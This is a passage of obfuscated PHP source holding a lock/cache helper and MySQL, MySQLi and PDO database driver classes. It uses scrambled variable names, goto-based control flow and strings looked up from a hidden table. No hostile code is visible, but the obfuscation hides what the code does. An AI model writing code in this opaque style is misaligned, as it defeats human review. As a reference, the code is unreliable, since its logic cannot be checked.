BŒ¼ÓÕ¹Ç: self::$timeout = $e‡óÊö…ã[$DîŠæĞÆ˜[775]] ? $e‡óÊö…ã[$DîŠæĞÆ˜[775]] : 10; $dÎùçä­ÜŸ = _get($GLOBALS[$DîŠæĞÆ˜[6]], $DîŠæĞÆ˜[776]); $b•ê¤·ôÍö = $e‡óÊö…ã[$DîŠæĞÆ˜[762]] ? $e‡óÊö…ã[$DîŠæĞÆ˜[762]] : $DîŠæĞÆ˜[173]; goto fĞÙ×‘“ÌÀ; CÀ™¡’Ö: } private static function key($c…ÃãÑƒİ¬) { return $_SERVER[ç][777] . Cache::key($c…ÃãÑƒİ¬); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($BèÀ¤ÓÑµà = '') { self::$errorMsg = $BèÀ¤ÓÑµà; } public static function lockGlobal($dæÔä±¸ì¼, $fßİÒÔŞ×È) { return self::lock($dæÔä±¸ì¼, $fßİÒÔŞ×È, !0); } public static function lock($bÚœÔŸ÷Â, $Aíå°³õ‹ = false, $e‰’ –¢¸ò = false) { goto EùÎ¸É¶´º; DØŞ›¥â¦¬: $Aíå°³õ‹ = $Aíå°³õ‹ ? $Aíå°³õ‹ : self::$timeout; $DÛáàñ÷­Ú = $Aİğ¤£öë×->lock($E•Ó‰¦¨Èœ, $Aíå°³õ‹); if (!$DÛáàñ÷­Ú) { $e±¨òÚß¦ù = "\154\x6f\x63\x6b\x20\x65\x72\x72\x6f\x72\73\153\145\171\x3d{$bÚœÔŸ÷Â}\x3b\x74\151\x6d\x65\75{$Aíå°³õ‹}\x3b" . self::$errorMsg . $cäÉ˜ÚÎ¬º[67] . get_caller_msg(); $EâóíÌÑ™ = LNG($cäÉ˜ÚÎ¬º[778]) . "\50{$Aíå°³õ‹}\x73\x29\56" . LNG($cäÉ˜ÚÎ¬º[779]); $EâóíÌÑ™ .= $cäÉ˜ÚÎ¬º[780]; if (is_string(self::$errorMsg) && self::$errorMsg) { $EâóíÌÑ™ = $EâóíÌÑ™ . $cäÉ˜ÚÎ¬º[781] . self::$errorMsg; } write_log($e±¨òÚß¦ù, $cäÉ˜ÚÎ¬º[782]); show_json($EâóíÌÑ™, !1); } goto c«°±À÷Ò; c«°±À÷Ò: if (!$e‰’ –¢¸ò) { self::$lockItem[$E•Ó‰¦¨Èœ] = !0; } return $DÛáàñ÷­Ú; goto FÜë³ç—£¶; EùÎ¸É¶´º: $cäÉ˜ÚÎ¬º =& $_SERVER[ç]; $Aİğ¤£öë× = self::init(); $E•Ó‰¦¨Èœ = self::key($bÚœÔŸ÷Â); goto DØŞ›¥â¦¬; FÜë³ç—£¶: } public static function lockGet($c©Ë™ä¼İÕ) { $Fœ‰¼ƒ“¤² = self::key($c©Ë™ä¼İÕ); if (self::$lockItem[$Fœ‰¼ƒ“¤²]) { return self::$lockItem[$Fœ‰¼ƒ“¤²]; } return self::init()->lockGet($Fœ‰¼ƒ“¤²); } public static function unlock($Fù–¬Ï§‘¹) { $EŒÀºÓ‚ƒ = self::key($Fù–¬Ï§‘¹); self::$lockItem[$EŒÀºÓ‚ƒ] = null; return self::init()->unlock($EŒÀºÓ‚ƒ); } public static function unlockRuntime() { $D‰Ìïœ‰Å¾ =& $_SERVER[ç]; $EÛÃÔµË÷“ = self::init(); $A‰Ã¸ŞÜµø = !1; foreach (self::$lockItem as $aœ³‰«ˆƒ => $fõ½ÑŞ¥Š) { if (!$fõ½ÑŞ¥Š) { continue; } $EÛÃÔµË÷“->unlock($aœ³‰«ˆƒ); if (!$A‰Ã¸ŞÜµø) { $A‰Ã¸ŞÜµø = !0; write_log($D‰Ìïœ‰Å¾[783] . $aœ³‰«ˆƒ . $D‰Ìïœ‰Å¾[67] . get_caller_msg(), $D‰Ìïœ‰Å¾[782]); continue; } write_log($D‰Ìïœ‰Å¾[783] . $aœ³‰«ˆƒ, $D‰Ìïœ‰Å¾[782]); } self::fileUnlockAll(); } public static function fileLock($D©Ñ»‹Ô­) { goto fîÙ‰¿ˆŞà; fÕ–‹òùÉ×: if (flock($Föœİà££, LOCK_EX)) { return !0; } self::unlock($D©Ñ»‹Ô­); show_json($CëÒ«–âÇŸ[787], !1); goto cİàÍ“—; E¢¡èê½Ô: $Föœİà££ = fopen(DATA_PATH . $D©Ñ»‹Ô­ . $CëÒ«–âÇŸ[785], $CëÒ«–âÇŸ[786]); if (!$Föœİà££) { return !1; } $GLOBALS[$CëÒ«–âÇŸ[784]][$D©Ñ»‹Ô­] = $Föœİà££; goto fÕ–‹òùÉ×; fîÙ‰¿ˆŞà: $CëÒ«–âÇŸ =& $_SERVER[ç]; if (!$GLOBALS[$CëÒ«–âÇŸ[784]]) { $GLOBALS[$CëÒ«–âÇŸ[784]] = array(); } $GLOBALS[$CëÒ«–âÇŸ[784]][$D©Ñ»‹Ô­] = !1; goto E¢¡èê½Ô; cİàÍ“—: return !1; goto AÑ’†‚; AÑ’†‚: } public static function fileUnlock($aöøìºÔßì) { $A•¼Š‰í…º =& $_SERVER[ç]; $b£ÈÌ“­œ = $GLOBALS[$A•¼Š‰í…º[784]][$aöøìºÔßì]; if (!$b£ÈÌ“­œ) { return; } $GLOBALS[$A•¼Š‰í…º[784]][$aöøìºÔßì] = !1; flock($b£ÈÌ“­œ, LOCK_UN); fclose($b£ÈÌ“­œ); } public static function fileUnlockAll() { $dß‡¾Ú’ =& $_SERVER[ç]; if (!$GLOBALS[$dß‡¾Ú’[784]]) { return; } foreach ($GLOBALS[$dß‡¾Ú’[784]] as $b‚ø›µóµµ => $d¬Êëè…ê) { if (!$d¬Êëè…ê) { continue; } $GLOBALS[$dß‡¾Ú’[784]][$b‚ø›µóµµ] = !1; flock($d¬Êëè…ê, LOCK_UN); fclose($d¬Êëè…ê); } $GLOBALS[$dß‡¾Ú’[784]] = array(); } } goto Dçí£‚¿™; Aƒ•¶ŠÌñÙ: class DbMysql extends Db { public function __construct($F´Œ§î—ª = '') { $AìšÍ‰ˆç =& $_SERVER[ç]; if (!extension_loaded($AìšÍ‰ˆç[735])) { think_exception(think_lang($AìšÍ‰ˆç[10]) . $AìšÍ‰ˆç[813]); } if (!empty($F´Œ§î—ª)) { $this->config = $F´Œ§î—ª; if (empty($this->config[$AìšÍ‰ˆç[13]])) { $this->config[$AìšÍ‰ˆç[13]] = $AìšÍ‰ˆç[33]; } } } public function connect($cÇõÇôä‹‹ = '', $BŠ„¦ë Ã† = 0, $f©›½ˆö¥ = false) { $EÏÈ‚ÃÀ³‚ =& $_SERVER[ç]; if (!isset($this->linkID[$BŠ„¦ë Ã†])) { goto dŒô¹ò…Î; fï¬ĞˆÄ¬: if (1 != think_config($EÏÈ‚ÃÀ³‚[18])) { unset($this->config); } goto cé×Óù§¾“; Cä¦Î®Šî : if ($F¹á¡£‡‡) { $this->linkID[$BŠ„¦ë Ã†] = mysql_pconnect($cŠ›–¾³•‡, $cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[816]], $cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[817]], 131072); } else { $this->linkID[$BŠ„¦ë Ã†] = mysql_connect($cŠ›–¾³•‡, $cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[816]], $cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[817]], !0, 131072); } if (!$this->linkID[$BŠ„¦ë Ã†] || !empty($cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[17]]) && !mysql_select_db($cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[17]], $this->linkID[$BŠ„¦ë Ã†])) { think_exception(mysql_error()); } $d¨ˆœÜ÷ = mysql_get_server_info($this->linkID[$BŠ„¦ë Ã†]); goto a¾ë“ô£•˜; dŒô¹ò…Î: if (empty($cÇõÇôä‹‹)) { $cÇõÇôä‹‹ = $this->config; } $cŠ›–¾³•‡ = $cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[814]] . ($cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[815]] ? "\72{$cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[815]]}" : $EÏÈ‚ÃÀ³‚[33]); $F¹á¡£‡‡ = !empty($cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[13]][$EÏÈ‚ÃÀ³‚[14]]) ? $cÇõÇôä‹‹[$EÏÈ‚ÃÀ³‚[13]][$EÏÈ‚ÃÀ³‚[14]] : $this->pconnect; goto Cä¦Î®Šî ; a¾ë“ô£•˜: mysql_query($EÏÈ‚ÃÀ³‚[818] . think_config($EÏÈ‚ÃÀ³‚[819]) . $EÏÈ‚ÃÀ³‚[55], $this->linkID[$BŠ„¦ë Ã†]); if ($d¨ˆœÜ÷ > $EÏÈ‚ÃÀ³‚[820]) { mysql_query($EÏÈ‚ÃÀ³‚[821], $this->linkID[$BŠ„¦ë Ã†]); } $this->connected = !0; goto fï¬ĞˆÄ¬; cé×Óù§¾“: } return $this->linkID[$BŠ„¦ë Ã†]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Cø×—åšêŸ) { goto fÉ¦‰Ú—àŠ; CÏÖ…Ä‰¸©: if (!$this->_linkID) { return !1; } $this->queryStr = $Cø×—åšêŸ; if ($this->queryID) { $this->free(); } goto fÔôßÚ£ÂÂ; fÔôßÚ£ÂÂ: think_action_status($F¡î»Æ—‡¼[19], 1); think_status($F¡î»Æ—‡¼[20]); $this->queryID = mysql_query($Cø×—åšêŸ, $this->_linkID); goto e¶¿àùÄ; fÉ¦‰Ú—àŠ: $F¡î»Æ—‡¼ =& $_SERVER[ç]; if (0 === stripos($Cø×—åšêŸ, $F¡î»Æ—‡¼[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto CÏÖ…Ä‰¸©; e¶¿àùÄ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto döÏ¡ğ”…°; döÏ¡ğ”…°: } public function execute($eö¡ÎÒíà) { goto D´ï‚Ó¡Ñ; b‚Ëí›äÛª: if (!1 === $BŒš‘¥…¿) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto b»‚ÃÔë‡æ; D´ï‚Ó¡Ñ: $c»”á¸§’Ù =& $_SERVER[ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c¶‘„á™±Ì; aœ“ñÕé¡ã: think_status($c»”á¸§’Ù[20]); $BŒš‘¥…¿ = mysql_query($eö¡ÎÒíà, $this->_linkID); $this->debug(); goto b‚Ëí›äÛª; c¶‘„á™±Ì: $this->queryStr = $eö¡ÎÒíà; if ($this->queryID) { $this->free(); } think_action_status($c»”á¸§’Ù[21], 1); goto aœ“ñÕé¡ã; b»‚ÃÔë‡æ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ç][822], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eÏéÖ¹äƒ = mysql_query($_SERVER[ç][823], $this->_linkID); $this->transTimes = 0; if (!$eÏéÖ¹äƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÉöØ·­ƒ = mysql_query($_SERVER[ç][824], $this->_linkID); $this->transTimes = 0; if (!$eÉöØ·­ƒ) { $this->error(); return !1; } } return !0; } private function getAll() { $bêé°¼æ§” = array(); if ($this->numRows > 0) { while ($AÂÁÎï·¸ = mysql_fetch_assoc($this->queryID)) { $bêé°¼æ§”[] = $AÂÁÎï·¸; } mysql_data_seek($this->queryID, 0); } return $bêé°¼æ§”; } public function getFields($fÇ§¶ğõô¤) { $a¿»Ÿò« =& $_SERVER[ç]; $bÊ„â¨¾Ğˆ = $this->query($a¿»Ÿò«[825] . $this->parseKey($fÇ§¶ğõô¤)); $f‰æ÷°—ë = array(); if ($bÊ„â¨¾Ğˆ) { foreach ($bÊ„â¨¾Ğˆ as $aœ‹²ä³Ùå => $c×µÏİÈõŒ) { $f‰æ÷°—ë[$c×µÏİÈõŒ[$a¿»Ÿò«[27]]] = array($a¿»Ÿò«[28] => $c×µÏİÈõŒ[$a¿»Ÿò«[27]], $a¿»Ÿò«[29] => $c×µÏİÈõŒ[$a¿»Ÿò«[30]], $a¿»Ÿò«[31] => (bool) (strtoupper($c×µÏİÈõŒ[$a¿»Ÿò«[32]]) === $a¿»Ÿò«[826]), $a¿»Ÿò«[34] => $c×µÏİÈõŒ[$a¿»Ÿò«[35]], $a¿»Ÿò«[36] => strtolower($c×µÏİÈõŒ[$a¿»Ÿò«[37]]) == $a¿»Ÿò«[38], $a¿»Ÿò«[39] => strtolower($c×µÏİÈõŒ[$a¿»Ÿò«[40]]) == $a¿»Ÿò«[41]); } } return $f‰æ÷°—ë; } public function getTables($BÓÓÌÀ…„Ø = '') { $b©¸¨¤ê =& $_SERVER[ç]; if (!empty($BÓÓÌÀ…„Ø)) { $cŠ¡…ÔÓ·³ = $b©¸¨¤ê[827] . $BÓÓÌÀ…„Ø . $b©¸¨¤ê[828]; } else { $cŠ¡…ÔÓ·³ = $b©¸¨¤ê[829]; } $dÄÚÇôîâå = $this->query($cŠ¡…ÔÓ·³); $aÌ‘Š„®Ÿ’ = array(); foreach ($dÄÚÇôîâå as $bÓòä”–‰— => $eŞ‹¹®¯ö) { $aÌ‘Š„®Ÿ’[$bÓòä”–‰—] = current($eŞ‹¹®¯ö); } return $aÌ‘Š„®Ÿ’; } public function replace($Cì›½ÔµÙ±, $aŠ½øÙÕÌ = array()) { $aó–¾ÂÖñÅ =& $_SERVER[ç]; foreach ($Cì›½ÔµÙ± as $A±§ô–ßĞ’ => $B’¡Ä¼šŠè) { $F¯›Â¨ŠÄ— = $this->parseValue($B’¡Ä¼šŠè); if (is_scalar($F¯›Â¨ŠÄ—)) { $bÂÓÄ½ê[] = $F¯›Â¨ŠÄ—; $AÕ÷•ÅÒ—Ì[] = $this->parseKey($A±§ô–ßĞ’); } } $dÆê¡–¨ = $aó–¾ÂÖñÅ[830] . $this->parseTable($aŠ½øÙÕÌ[$aó–¾ÂÖñÅ[275]]) . $aó–¾ÂÖñÅ[831] . implode($aó–¾ÂÖñÅ[47], $AÕ÷•ÅÒ—Ì) . $aó–¾ÂÖñÅ[832] . implode($aó–¾ÂÖñÅ[47], $bÂÓÄ½ê) . $aó–¾ÂÖñÅ[833]; return $this->execute($dÆê¡–¨); } public function insertAll($Bô‚Ğ†äœ, $E•Îóêé˜ = array(), $c¥áÔ›·ñÀ = false) { goto BÕ„ÕÄî ‘; BÕ„ÕÄî ‘: $bø¯§ÂÉˆ‰ =& $_SERVER[ç]; if (!is_array($Bô‚Ğ†äœ[0])) { return !1; } $cåÉÛ†ó¶ = array_keys($Bô‚Ğ†äœ[0]); goto DÌ¹ÏâñÁÊ; DÌ¹ÏâñÁÊ: $D¥Ü¥ƒ‰ƒé = array(); foreach ($Bô‚Ğ†äœ as $aé—ÙÇÂŒ) { $B¦äß¦Ô™£ = array(); foreach ($aé—ÙÇÂŒ as $e½÷„ƒÑóÔ => $eÁ¡¡¤¬Û¢) { $eÁ¡¡¤¬Û¢ = $this->parseValue($eÁ¡¡¤¬Û¢); if (is_scalar($eÁ¡¡¤¬Û¢)) { $B¦äß¦Ô™£[] = $eÁ¡¡¤¬Û¢; } } $D¥Ü¥ƒ‰ƒé[] = $bø¯§ÂÉˆ‰[256] . implode($bø¯§ÂÉˆ‰[47], $B¦äß¦Ô™£) . $bø¯§ÂÉˆ‰[833]; } array_walk($cåÉÛ†ó¶, array($this, $bø¯§ÂÉˆ‰[834])); goto C¼İ´ŸÁéİ; C¼İ´ŸÁéİ: $dÖ«ÍÙé”ö = ($c¥áÔ›·ñÀ ? $bø¯§ÂÉˆ‰[835] : $bø¯§ÂÉˆ‰[836]) . $bø¯§ÂÉˆ‰[837] . $this->parseTable($E•Îóêé˜[$bø¯§ÂÉˆ‰[275]]) . $bø¯§ÂÉˆ‰[831] . implode($bø¯§ÂÉˆ‰[47], $cåÉÛ†ó¶) . $bø¯§ÂÉˆ‰[838] . implode($bø¯§ÂÉˆ‰[47], $D¥Ü¥ƒ‰ƒé); return $this->execute($dÖ«ÍÙé”ö); goto BÙ’Ïá¦ª; BÙ’Ïá¦ª: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fº ¦öÏ«Ì =& $_SERVER[ç]; $this->error = mysql_errno() . $fº ¦öÏ«Ì[4] . mysql_error($this->_linkID); if ($fº ¦öÏ«Ì[33] != $this->queryStr) { $this->error .= LNG($fº ¦öÏ«Ì[45]) . $this->queryStr; } think_trace($this->error, $fº ¦öÏ«Ì[33], $fº ¦öÏ«Ì[46]); return $this->error; } public function escapeString($f×ï®Œ¹ğ¯) { if ($this->_linkID) { return mysql_real_escape_string($f×ï®Œ¹ğ¯, $this->_linkID); } else { return mysql_escape_string($f×ï®Œ¹ğ¯); } } public function parseKey(&$A¥å¿ƒ÷µÊ, $b¶Æİºù‚Ç = true) { $b±ÖáÆóİ„ =& $_SERVER[ç]; if ($b¶Æİºù‚Ç) { $A¥å¿ƒ÷µÊ = $this->parseKeyCheck($A¥å¿ƒ÷µÊ); } if ($A¥å¿ƒ÷µÊ != $b±ÖáÆóİ„[182] && !preg_match($b±ÖáÆóİ„[839], $A¥å¿ƒ÷µÊ)) { $A¥å¿ƒ÷µÊ = $b±ÖáÆóİ„[380] . trim($A¥å¿ƒ÷µÊ, $b±ÖáÆóİ„[380]) . $b±ÖáÆóİ„[380]; } return $A¥å¿ƒ÷µÊ; } } class DbMysqli extends Db { public function __construct($C‚Ààğ‰ƒÀ = '') { $D¢Èã¥Ùê® =& $_SERVER[ç]; if (!extension_loaded($D¢Èã¥Ùê®[734])) { think_exception(think_lang($D¢Èã¥Ùê®[10]) . $D¢Èã¥Ùê®[840]); } if (!empty($C‚Ààğ‰ƒÀ)) { $this->config = $C‚Ààğ‰ƒÀ; if (empty($this->config[$D¢Èã¥Ùê®[13]])) { $this->config[$D¢Èã¥Ùê®[13]] = $D¢Èã¥Ùê®[33]; } } } public function connect($aãÌğ‘¾ìÜ = '', $Bğ¢À‡·‚¿ = 0) { $Fˆ´Ä³è†² =& $_SERVER[ç]; if (!isset($this->linkID[$Bğ¢À‡·‚¿])) { goto c†˜ÕÏÚ·‘; dµŒù™¬è: $this->connected = !0; if (1 != think_config($Fˆ´Ä³è†²[18])) { unset($this->config); } goto b‡‹©Ä¹Æ«; e‘ãÁ¶Ü§: $e“é‚¡àâ¹ = $this->linkID[$Bğ¢À‡·‚¿]->server_version; $this->linkID[$Bğ¢À‡·‚¿]->query($Fˆ´Ä³è†²[818] . think_config($Fˆ´Ä³è†²[819]) . $Fˆ´Ä³è†²[55]); if ($e“é‚¡àâ¹ > $Fˆ´Ä³è†²[820]) { $this->linkID[$Bğ¢À‡·‚¿]->query($Fˆ´Ä³è†²[821]); } goto dµŒù™¬è; c†˜ÕÏÚ·‘: if (empty($aãÌğ‘¾ìÜ)) { $aãÌğ‘¾ìÜ = $this->config; } $this->linkID[$Bğ¢À‡·‚¿] = new mysqli($aãÌğ‘¾ìÜ[$Fˆ´Ä³è†²[814]], $aãÌğ‘¾ìÜ[$Fˆ´Ä³è†²[816]], $aãÌğ‘¾ìÜ[$Fˆ´Ä³è†²[817]], $aãÌğ‘¾ìÜ[$Fˆ´Ä³è†²[17]], $aãÌğ‘¾ìÜ[$Fˆ´Ä³è†²[815]] ? intval($aãÌğ‘¾ìÜ[$Fˆ´Ä³è†²[815]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto e‘ãÁ¶Ü§; b‡‹©Ä¹Æ«: } return $this->linkID[$Bğ¢À‡·‚¿]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($a‘éù²¥èµ) { goto DÑ»á¸ê¯; CÕ«Œ¼³ÖŠ: $this->queryStr = $a‘éù²¥èµ; if ($this->queryID) { $this->free(); } think_action_status($BŠ’ƒ³ÖµÏ[19], 1); goto A»¯©³˜š; f”øµ™¿îò: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto D¾Ñ‘ÄÑ‡; DÑ»á¸ê¯: $BŠ’ƒ³ÖµÏ =& $_SERVER[ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÕ«Œ¼³ÖŠ; A»¯©³˜š: think_status($BŠ’ƒ³ÖµÏ[20]); $this->queryID = $this->_linkID->query($a‘éù²¥èµ); if ($this->_linkID->more_results()) { while (($aë†Ğ •Âß = $this->_linkID->next_result()) != NULL) { $aë†Ğ •Âß->free_result(); } } goto f”øµ™¿îò; D¾Ñ‘ÄÑ‡: } public function execute($eˆÄ»à†) { goto dŠ¿à©šñ”; fÚ±ß™æÛÁ: think_status($BÁ›¤œŸò“[20]); $A†Å·ÌŸÅñ = $this->_linkID->query($eˆÄ»à†); $this->debug(); goto aíà„¼Ôò¯; c¦óÇñÅŠÕ: $this->queryStr = $eˆÄ»à†; if ($this->queryID) { $this->free(); } think_action_status($BÁ›¤œŸò“[21], 1); goto fÚ±ß™æÛÁ; dŠ¿à©šñ”: $BÁ›¤œŸò“ =& $_SERVER[ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c¦óÇñÅŠÕ; aíà„¼Ôò¯: if (!1 === $A†Å·ÌŸÅñ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto aÆÑÓÜ£÷¹; aÆÑÓÜ£÷¹: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aÃô±¢ÌÃ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$aÃô±¢ÌÃ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A¸ÅÆøŞêø = $this->_linkID->rollback(); $this->transTimes = 0; if (!$A¸ÅÆøŞêø) { $this->error(); return !1; } } return !0; } private function getAll() { $A±Ö¼ÕŠ²’ = array(); if ($this->numRows > 0) { for ($Bïæ²‘á“· = 0; $Bïæ²‘á“· < $this->numRows; $Bïæ²‘á“·++) { $A±Ö¼ÕŠ²’[$Bïæ²‘á“·] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $A±Ö¼ÕŠ²’; } public function getFields($A·Ş‡¼áÈ±) { $CµÊƒÊìíá =& $_SERVER[ç]; $DÕÉ­´÷Üš = $this->query($CµÊƒÊìíá[825] . $this->parseKey($A·Ş‡¼áÈ±)); $DªèªêÎ™ = array(); if ($DÕÉ­´÷Üš) { foreach ($DÕÉ­´÷Üš as $aÑ­ÊÒ‹Í => $aßõËÊà´‚) { $DªèªêÎ™[$aßõËÊà´‚[$CµÊƒÊìíá[27]]] = array($CµÊƒÊìíá[28] => $aßõËÊà´‚[$CµÊƒÊìíá[27]], $CµÊƒÊìíá[29] => $aßõËÊà´‚[$CµÊƒÊìíá[30]], $CµÊƒÊìíá[31] => (bool) ($aßõËÊà´‚[$CµÊƒÊìíá[32]] === $CµÊƒÊìíá[33]), $CµÊƒÊìíá[34] => $aßõËÊà´‚[$CµÊƒÊìíá[35]], $CµÊƒÊìíá[36] => strtolower($aßõËÊà´‚[$CµÊƒÊìíá[37]]) == $CµÊƒÊìíá[38], $CµÊƒÊìíá[39] => strtolower($aßõËÊà´‚[$CµÊƒÊìíá[40]]) == $CµÊƒÊìíá[41]); } } return $DªèªêÎ™; } public function getTables($E§ÌáÄ”‘ê = '') { $Bß«“Ë—Ê =& $_SERVER[ç]; $C´Ôòí­ç = !empty($E§ÌáÄ”‘ê) ? $Bß«“Ë—Ê[827] . $E§ÌáÄ”‘ê . $Bß«“Ë—Ê[828] : $Bß«“Ë—Ê[829]; $aÌïæˆˆ² = $this->query($C´Ôòí­ç); $a¿îÂøŸ¼„ = array(); if ($aÌïæˆˆ²) { foreach ($aÌïæˆˆ² as $f‡Öƒ¼÷ => $Eá¨¡ØÕ§õ) { $a¿îÂøŸ¼„[$f‡Öƒ¼÷] = current($Eá¨¡ØÕ§õ); } } return $a¿îÂøŸ¼„; } public function replace($eÏÃÜòá˜, $båÚ·æÉ‚ = array()) { $Eæ•«µ‡–ä =& $_SERVER[ç]; foreach ($eÏÃÜòá˜ as $EãµÀ„ëˆì => $A©¡©óšÍ“) { $b—í£ææé„ = $this->parseValue($A©¡©óšÍ“); if (is_scalar($b—í£ææé„)) { $bå„Š˜ãá[] = $b—í£ææé„; $cåğÏá¬Õ[] = $this->parseKey($EãµÀ„ëˆì); } } $Eœ÷Éëâ‰ß = $Eæ•«µ‡–ä[830] . $this->parseTable($båÚ·æÉ‚[$Eæ•«µ‡–ä[275]]) . $Eæ•«µ‡–ä[831] . implode($Eæ•«µ‡–ä[47], $cåğÏá¬Õ) . $Eæ•«µ‡–ä[832] . implode($Eæ•«µ‡–ä[47], $bå„Š˜ãá) . $Eæ•«µ‡–ä[833]; return $this->execute($Eœ÷Éëâ‰ß); } public function insertAll($FîÂåŞĞõ, $e”²Áæ©Ğí = array(), $b²ø¢Œ•Î = false) { goto Dˆ½äÁÉƒ; FÌ·„ªã¿Ğ: $DµÂ¤‚²ó = $b²ø¢Œ•Î ? $bÛ÷ÈÙŞâÍ[835] : $bÛ÷ÈÙŞâÍ[836]; $Fğ¤áˆ’½Õ = $DµÂ¤‚²ó . $bÛ÷ÈÙŞâÍ[837] . $this->parseTable($e”²Áæ©Ğí[$bÛ÷ÈÙŞâÍ[275]]) . $bÛ÷ÈÙŞâÍ[831] . implode($bÛ÷ÈÙŞâÍ[47], $e£¦Øø™™…) . $bÛ÷ÈÙŞâÍ[838] . implode($bÛ÷ÈÙŞâÍ[47], $A¹‘Ÿ…º™Ø); return $this->execute($Fğ¤áˆ’½Õ); goto dÙíğóñ‚»; Dˆ½äÁÉƒ: $bÛ÷ÈÙŞâÍ =& $_SERVER[ç]; if (!is_array($FîÂåŞĞõ[0])) { return !1; } $e£¦Øø™™… = array_keys($FîÂåŞĞõ[0]); goto Dî°•¹é°; Dî°•¹é°: $A¹‘Ÿ…º™Ø = array(); foreach ($FîÂåŞĞõ as $Bù÷ÌÆ‘) { $DŒ„»àƒˆã = array(); foreach ($Bù÷ÌÆ‘ as $bÉèÓ±°ÁÀ => $cÒ…òĞˆŒ) { $cÒ…òĞˆŒ = $this->parseValue($cÒ…òĞˆŒ); if (is_scalar($cÒ…òĞˆŒ)) { $DŒ„»àƒˆã[] = $cÒ…òĞˆŒ; } } $A¹‘Ÿ…º™Ø[] = $bÛ÷ÈÙŞâÍ[256] . implode($bÛ÷ÈÙŞâÍ[47], $DŒ„»àƒˆã) . $bÛ÷ÈÙŞâÍ[833]; } array_walk($e£¦Øø™™…, array($this, $bÛ÷ÈÙŞâÍ[834])); goto FÌ·„ªã¿Ğ; dÙíğóñ‚»: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $D´‘Œ¹˜ =& $_SERVER[ç]; $this->error = $this->_linkID->errno . $D´‘Œ¹˜[4] . $this->_linkID->error; if ($D´‘Œ¹˜[33] != $this->queryStr) { $this->error .= LNG($D´‘Œ¹˜[45]) . $this->queryStr; } think_trace($this->error, $D´‘Œ¹˜[33], $D´‘Œ¹˜[46]); return $this->error; } public function escapeString($f¤õÊˆ¯ñÌ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($f¤õÊˆ¯ñÌ); } else { return addslashes($f¤õÊˆ¯ñÌ); } } public function parseKey(&$f¯Ïñ‚÷Ïè, $bÕó’¥¬‡ä = true) { $F„‚«ì¢ä£ =& $_SERVER[ç]; if ($bÕó’¥¬‡ä) { $f¯Ïñ‚÷Ïè = $this->parseKeyCheck($f¯Ïñ‚÷Ïè); } if ($f¯Ïñ‚÷Ïè != $F„‚«ì¢ä£[182] && !preg_match($F„‚«ì¢ä£[839], $f¯Ïñ‚÷Ïè)) { $f¯Ïñ‚÷Ïè = $F„‚«ì¢ä£[380] . trim($f¯Ïñ‚÷Ïè, $F„‚«ì¢ä£[380]) . $F„‚«ì¢ä£[380]; } return $f¯Ïñ‚÷Ïè; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($c¶äÕä«ÃÈ = '') { $b­›È·Œ‰ =& $_SERVER[ç]; if (!class_exists($b­›È·Œ‰[841])) { think_exception(think_lang($b­›È·Œ‰[10]) . $b­›È·Œ‰[842]); } if (!empty($c¶äÕä«ÃÈ)) { $this->config = $c¶äÕä«ÃÈ; if (empty($this->config[$b­›È·Œ‰[13]])) { $this->config[$b­›È·Œ‰[13]] = array(); } } } public function connect($bä‹©çãøß = '', $eÃã—àªÎ¶ = 0) { $B¶ —†¶²ª =& $_SERVER[ç]; if (!isset($this->linkID[$eÃã—àªÎ¶])) { goto Fî¾ŞØ¥Š; Dƒ¶¨†Œ‘: try { $this->linkID[$eÃã—àªÎ¶] = new PDO($bä‹©çãøß[$B¶ —†¶²ª[843]], $bä‹©çãøß[$B¶ —†¶²ª[816]], $bä‹©çãøß[$B¶ —†¶²ª[817]], $bä‹©çãøß[$B¶ —†¶²ª[13]]); } catch (PDOException $BºŸÉ“ÇÏÉ) { think_exception($BºŸÉ“ÇÏÉ->getMessage()); } $this->dbType = $this->_getDsnType($bä‹©çãøß[$B¶ —†¶²ª[843]]); if (in_array($this->dbType, array($B¶ —†¶²ª[844], $B¶ —†¶²ª[845], $B¶ —†¶²ª[846], $B¶ —†¶²ª[847]))) { think_exception($B¶ 